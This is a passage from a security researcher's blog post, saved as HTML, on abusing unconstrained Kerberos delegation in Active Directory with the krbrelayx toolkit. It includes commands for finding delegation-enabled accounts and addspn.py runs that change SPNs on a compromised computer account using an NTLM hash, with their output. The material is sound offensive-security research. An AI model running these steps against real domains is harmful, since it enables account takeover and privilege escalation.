@@ -1,0 +1,834 @@
+<html lang="en" class="js fontawesome-i2svg-active fontawesome-i2svg-complete"><head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>“Relaying” Kerberos - Having fun with unconstrained delegation - dirkjanm.io</title>
+<meta name="description" content="There have been some interesting new developments recently to abuse Kerberos in Active Directory, and after my dive into Kerberos across trusts a few months ago, this post is about a relatively unknown (from attackers perspective), but dangerous feature: unconstrained Kerberos delegation. During the writing of this blog, this became quite a bit more relevant with the discovery of some interesting RPC calls that can get Domain Controllers to authenticate to you, which even allow for compromise across forest boundaries. Then there was the discovery of PrivExchange which can make Exchange authenticate in a similar way. Because tooling for unconstrained delegation abuse is quite scarce, I wrote a new toolkit, krbrelayx, which can abuse unconstrained delegation and get Ticket Granting Tickets (TGTs) from users connecting to your host. In this blog we will dive deeper into unconstrained delegation abuse and into some more advanced attacks that are possible with the krbrelayx toolkit.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="dirkjanm.io">
+<meta property="og:title" content="“Relaying” Kerberos - Having fun with unconstrained delegation">
+<meta property="og:url" content="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">
+
+
+  <meta property="og:description" content="There have been some interesting new developments recently to abuse Kerberos in Active Directory, and after my dive into Kerberos across trusts a few months ago, this post is about a relatively unknown (from attackers perspective), but dangerous feature: unconstrained Kerberos delegation. During the writing of this blog, this became quite a bit more relevant with the discovery of some interesting RPC calls that can get Domain Controllers to authenticate to you, which even allow for compromise across forest boundaries. Then there was the discovery of PrivExchange which can make Exchange authenticate in a similar way. Because tooling for unconstrained delegation abuse is quite scarce, I wrote a new toolkit, krbrelayx, which can abuse unconstrained delegation and get Ticket Granting Tickets (TGTs) from users connecting to your host. In this blog we will dive deeper into unconstrained delegation abuse and into some more advanced attacks that are possible with the krbrelayx toolkit.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2019-02-18T18:08:57+00:00">
+
+
+
+
+
+
+<style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1em}.svg-inline--fa.fa-stack-2x{height:2em;width:2em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link rel="canonical" href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="dirkjanm.io Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    
+  <style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>
+
+  <body class="layout--single wide" style="margin-bottom: 229.767px;">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">dirkjanm.io</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/talks/">Presentations</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button" style="" count="0">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope="" itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/img/thisisapicture.png" alt="Dirk-jan Mollema" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Dirk-jan Mollema</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Hacker, red teamer, researcher. Likes to write infosec-focussed Python tools. This is my personal blog containing research on topics I find interesting, such as (Azure) Active Directory internals, protocols and vulnerabilities.<br><br>Looking for a security test or training? Business contact via <a href="https://outsidersecurity.nl">outsidersecurity.nl</a>
+
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope="" itemtype="http://schema.org/Place">
+          <svg class="svg-inline--fa fa-map-marker-alt fa-w-12 fa-fw" aria-hidden="true" data-prefix="fas" data-icon="map-marker-alt" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" data-fa-i2svg=""><path fill="currentColor" d="M172.268 501.67C26.97 291.031 0 269.413 0 192 0 85.961 85.961 0 192 0s192 85.961 192 192c0 77.413-26.97 99.031-172.268 309.67-9.535 13.774-29.93 13.773-39.464 0zM192 272c44.183 0 80-35.817 80-80s-35.817-80-80-80-80 35.817-80 80 35.817 80 80 80z"></path></svg><!-- <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> --> <span itemprop="name">Both sides of a security boundary</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://twitter.com/_dirkjan" itemprop="sameAs">
+            <svg class="svg-inline--fa fa-twitter-square fa-w-14 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="twitter-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5 0 86.7-66 186.6-186.6 186.6-37.2 0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7 0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447 0 0 1-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9 0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"></path></svg><!-- <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> --> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/dirkjanm" itemprop="sameAs">
+            <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg><!-- <i class="fab fa-fw fa-github" aria-hidden="true"></i> --> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        
+          <li>
+            <a href="https://www.youtube.com/c/dirkjanm" itemprop="sameAs">
+              <svg class="svg-inline--fa fa-youtube fa-w-18 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="youtube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" data-fa-i2svg=""><path fill="currentColor" d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"></path></svg><!-- <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> --> YouTube
+            </a>
+          </li>
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope="" itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="“Relaying” Kerberos - Having fun with unconstrained delegation">
+    <meta itemprop="description" content="There have been some interesting new developments recently to abuse Kerberos in Active Directory, and after my dive into Kerberos across trusts a few months ago, this post is about a relatively unknown (from attackers perspective), but dangerous feature: unconstrained Kerberos delegation. During the writing of this blog, this became quite a bit more relevant with the discovery of some interesting RPC calls that can get Domain Controllers to authenticate to you, which even allow for compromise across forest boundaries. Then there was the discovery of PrivExchange which can make Exchange authenticate in a similar way. Because tooling for unconstrained delegation abuse is quite scarce, I wrote a new toolkit, krbrelayx, which can abuse unconstrained delegation and get Ticket Granting Tickets (TGTs) from users connecting to your host. In this blog we will dive deeper into unconstrained delegation abuse and into some more advanced attacks that are possible with the krbrelayx toolkit.">
+    <meta itemprop="datePublished" content="February 18, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">“Relaying” Kerberos - Having fun with unconstrained delegation
+</h1>
+          
+            <p class="page__meta"><svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" data-prefix="far" data-icon="clock" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg><!-- <i class="far fa-clock" aria-hidden="true"></i> --> 
+
+
+
+
+  27 minute read
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>There have been some interesting new developments recently to abuse Kerberos in Active Directory, and after my dive into <a href="/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/">Kerberos across trusts</a> a few months ago, this post is about a relatively unknown (from attackers perspective), but dangerous feature: unconstrained Kerberos delegation. During the writing of this blog, this became quite a bit more relevant with the discovery of some interesting RPC calls that can get Domain Controllers to authenticate to you, which even allow for compromise <a href="http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">across forest boundaries</a>. Then there was the discovery of <a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">PrivExchange</a> which can make Exchange authenticate in a similar way. Because tooling for unconstrained delegation abuse is quite scarce, I wrote a new toolkit, <strong>krbrelayx</strong>, which can abuse unconstrained delegation and get Ticket Granting Tickets (TGTs) from users connecting to your host. In this blog we will dive deeper into unconstrained delegation abuse and into some more advanced attacks that are possible with the krbrelayx toolkit.</p>
+
+<h2 id="relaying-kerberos">Relaying Kerberos???</h2>
+<p>Before we start off, let’s clear up a possible confusion: no, you cannot actually relay Kerberos authentication in the way you can relay NTLM authentication. The reason the tool I’m releasing is called krbrelayx is because it works in a way similar to impackets <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx</a> (and shares quite some parts of the code). Kerberos tickets are partially encrypted with a key based on the password of the service a user is authenticating to, so sending this on to a different service is pointless as they won’t be able to decrypt the ticket (and thus we can’t authenticate). <strong>Update February 2022</strong>: Turns out there is more to this than I thought, and you can now relay Kerberos with krbrelayx. Check out the follow-up blog on this <a href="/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/">here</a>.</p>
+
+<p>So what does this tool actually do? When Windows authenticates to service- or computer accounts that have unconstrained delegation enabled, some interesting stuff happens (which I’ll explain later on) and those accounts end up with a usable TGT. If we (as an attacker) are the ones in control of this account, this TGT can then be used to authenticate to other services. Krbrelayx performs this in a similar way to when you are relaying with ntlmrelayx (with automatic dumping of passwords, obtaining DA privileges, or performing ACL based attacks), hence the similar naming. If you first want to read about what unconstrained delegation is on a high level, I recommend <a href="https://adsecurity.org/?p=1667">Sean Metcalf’s blog</a> about it.</p>
+
+<h2 id="attack-requirements">Attack requirements</h2>
+<p>To perform this unconstrained delegation attack, we already need to have a couple of requirements:</p>
+
+<ol>
+  <li>Control over an account with unconstrained delegation privileges</li>
+  <li>Permissions to modify the servicePrincipalName attribute of that account (optional)</li>
+  <li>Permissions to add/modify DNS records (optional)</li>
+  <li>A way to connect victim users/computers to us</li>
+</ol>
+
+<h3 id="unconstrained-delegation-account">Unconstrained delegation account</h3>
+<p>The first thing we need is an account that has unconstrained delegation privileges. This means an account that has the <code class="language-plaintext highlighter-rouge">TRUSTED_FOR_DELEGATION</code> UserAccountControl flag set. This can be on either a user account or a computer account. Any user in AD can query those accounts, using for example <a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">PowerView</a>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$Computers = Get-DomainComputer -Unconstrained
+$Users = Get-DomainUser -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
+</code></pre></div></div>
+<p>Or the ActiveDirectory Powershell module:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$computers = get-adcomputer -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
+$user = get-aduser -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
+</code></pre></div></div>
+<p>Or they can be extracted using one of my own tools, <a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a>, which will report users/computers that have this privilege with the <code class="language-plaintext highlighter-rouge">TRUSTED_FOR_DELEGATION</code> flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grep TRUSTED_FOR_DELEGATION domain_computers.grep
+grep TRUSTED_FOR_DELEGATION domain_users.grep
+</code></pre></div></div>
+
+<p>Once we compromised an account, which means we have obtained the account password or Kerberos keys, we can decrypt Kerberos service tickets used by users authenticating to the service associated with the compromised account. Previous ways to abuse unconstrained delegation involve dumping the cached tickets from LSASS using for example Mimikatz or <a href="https://github.com/GhostPack/Rubeus/">Rubeus</a>, but this requires executing code on a compromised host. In this blog we’ll avoid doing that, and instead do the whole thing over the network from a host we fully control without having to worry about endpoint detection or crashing production servers by dumping processes (though this doesn’t apply to Rubeus since it uses native APIs).</p>
+
+<p>For user accounts, passwords can be obtained the typical way, by Kerberoasting, cracking NTLMv1/NTLMv2 authentication, simply guessing weak passwords or dumping them from memory on compromised hosts. Computer accounts are harder to obtain since they do by default have very strong randomly generated passwords and their password/keys only reside on the host the account belongs to (or on the DC). When we have Administrator rights on the associated host, it becomes relatively easy since the computer account password is stored in the registry and thus can be obtained via the network with <a href="https://github.com/SecureAuthCorp/impacket/tree/master/examples">secretsdump.py</a>, or by dumping the secrets with mimikatz <code class="language-plaintext highlighter-rouge">lsadump::secrets</code>. Both also support dumping secrets from offline registry hives.</p>
+
+<p>To calculate the Kerberos keys from plaintext passwords, we also need to specify the salt. If you’re familiar with Kerberos, you’ll know that there are different encryption algorithms used. The weakest cipher supported by modern AD installs uses RC4, with a key based on the NTLM hash of the user (not including any salt). The AES-128 and AES-256 ciphers that Windows will pick by default however do include a salt, which we will need to include in the key calculation. The salt to calculate these keys <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1#L4187">is as follows</a>:</p>
+
+<ul>
+  <li>For user accounts, it is the uppercase Kerberos realm name + case sensitive username</li>
+  <li>For computer accounts, it is the uppercase realm name + the word host + full lowercase hostname</li>
+</ul>
+
+<p>The Kerberos realm name is the fully qualified domain name (FQDN) of the domain (so not the NETBIOS name!), the full hostname is also the FQDN of the host, not just the machine name, and does not include an $. The username used as salt for user accounts is the case-sensitive SAMAccountName (so if the user is called <code class="language-plaintext highlighter-rouge">awEsOmEusER1</code> then <code class="language-plaintext highlighter-rouge">awesomeuser1</code> will not generate the correct key).</p>
+
+<p>For computer accounts, I’ve added functionality to <code class="language-plaintext highlighter-rouge">secretsdump.py</code> which will automatically dump the machine Kerberos keys if you run it against a host (you will need at least impacket <code class="language-plaintext highlighter-rouge">0.9.18</code> or run the latest development version <a href="https://github.com/CoreSecurity/impacket">from git</a>). If it can’t figure out the correct salt for some reason you can specify this yourself to krbrelayx.py with the <code class="language-plaintext highlighter-rouge">--krbpass</code> or <code class="language-plaintext highlighter-rouge">--krbhexpass</code> (for hex encoded binary computer account passwords) and <code class="language-plaintext highlighter-rouge">--krbsalt</code> parameters. As a side note, this took me way longer than expected to implement since computer accounts passwords are random binary in UTF-16-LE, but Kerberos uses UTF-8 input for key derivation. The UTF-16 bytes are however not valid Unicode, which makes Python not too happy when you try to convert this to UTF-8. It took me a while to figure out that Microsoft implementations actually implicitly replace all invalid Unicode characters when performing the conversion to UTF-8 for Kerberos keys. After telling Python to do the same the keys started matching with those on my DC ¯\_(ツ)_/¯.</p>
+
+<h3 id="control-over-serviceprincipalname-attribute-of-the-unconstrained-delegation-account">Control over ServicePrincipalName attribute of the unconstrained delegation account</h3>
+<p>After having obtained the Kerberos keys of the compromised account we can decrypt the tickets, but we haven’t discussed yet how to actually get hosts to authenticate to us using Kerberos. When a user or computer wants to authenticate with Kerberos to the host <code class="language-plaintext highlighter-rouge">somehost.corp.com</code> over SMB, Windows will send a request for a service ticket to the Domain Controller. This request will include the Service Principal Name (SPN), made up from the protocol and the host which the service is on. In this example this would be <code class="language-plaintext highlighter-rouge">cifs/somehost.corp.com</code>. The Domain Controller performs a lookup in the directory which account (if any) has this ServicePrincipalName assigned, and then uses the Kerberos keys associated with that account to encrypt the service ticket (I’m skipping on the technical details for now, you can find those in a later paragraph).</p>
+
+<p>To make sure that victims authenticate to the account with unconstrained delegation and that we can decrypt the tickets, we need to make sure to send their traffic to a hostname of which the SPN is associated with the account we are impersonating. If we have the hostname <code class="language-plaintext highlighter-rouge">attacker.corp.com</code> and that SPN is not registered to the right account, the attack won’t work. The easiest way to do this is if we have control over an account that has privileges to edit attributes of the computer- or useraccount that we compromised, in which case we can just add the SPN to that account using the <a href="https://github.com/dirkjanm/krbrelayx/">addspn.py</a> utility that is included with krbrelayx:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/adtools$ python addspn.py -u testsegment\\backupadmin -s host/testme.testsegment.local -t w10-outlook.testsegment.local ldap://s2016dc.testsegment.local
+Password: 
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+</code></pre></div></div>
+
+<p>If we don’t have those privileges, it is a bit more complicated, and for user accounts I haven’t found a way to modify the SPNs without having those rights assigned. Computer accounts can by default add their own SPNs via the “Validated write to servicePrincipalName” right, but they can <a href="https://msdn.microsoft.com/en-us/library/cc223460.aspx">only write SPNs</a> that match their full hostname or SAMAccountName. This would seem like a dead end, but there is a way around this! There is an additional validated write right, which allows computers to update their own <code class="language-plaintext highlighter-rouge">msDS-AdditionalDnsHostName</code> property, which got introduced in Server 2012 and contains additional hostnames for a computer object. According to <a href="https://msdn.microsoft.com/en-us/library/cc223459.aspx">the documentation</a>, this validated write allows us to add any hostname which has the FQDN of the domain that we are in as a suffix, as long as we have the <code class="language-plaintext highlighter-rouge">Validated-MS-DS-Additional-DNS-Host-Name</code> validated write right. This right is not assigned by default:</p>
+
+<p><img src="/assets/img/kerberos/validated-writes.png" alt="SELF rights for computer objects" class="align-center"></p>
+
+<p>While playing with this property however, it turned out that the <code class="language-plaintext highlighter-rouge">Validated-MS-DS-Additional-DNS-Host-Name</code> validated write right isn’t actually needed to update the <code class="language-plaintext highlighter-rouge">msDS-AdditionalDnsHostName</code> property. The “Validated write to DNS host name”, which is enabled for computer objects by default, does also allow us to write to the <code class="language-plaintext highlighter-rouge">msDS-AdditionalDnsHostName</code> property, and allows us to assign any hostname within the current domain to the computer object, for which SPNs will then automatically be added. With this trick it is possible to add an SPN to our account that we can point to a hostname that is under the control of an attacker:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/adtools$ python addspn.py -u testsegment\\w10-outlook\$ -p aad3b435b51404eeaad3b435b51404ee:7a99efdea0e03b94db2e54c85911af47 -s testme.testsegment.local s2016dc.testsegment.local
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+user@localhost:~/adtools$ python addspn.py -u testsegment\\w10-outlook\$ -p aad3b435b51404eeaad3b435b51404ee:7a99efdea0e03b94db2e54c85911af47 s2016dc.testsegment.local -q
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+DN: CN=W10-OUTLOOK,CN=Computers,DC=testsegment,DC=local - STATUS: Read - READ TIME: 2018-11-18T20:44:33.730958
+    dNSHostName: W10-OUTLOOK.testsegment.local
+    msDS-AdditionalDnsHostName: TESTME$
+                                testme.testsegment.local
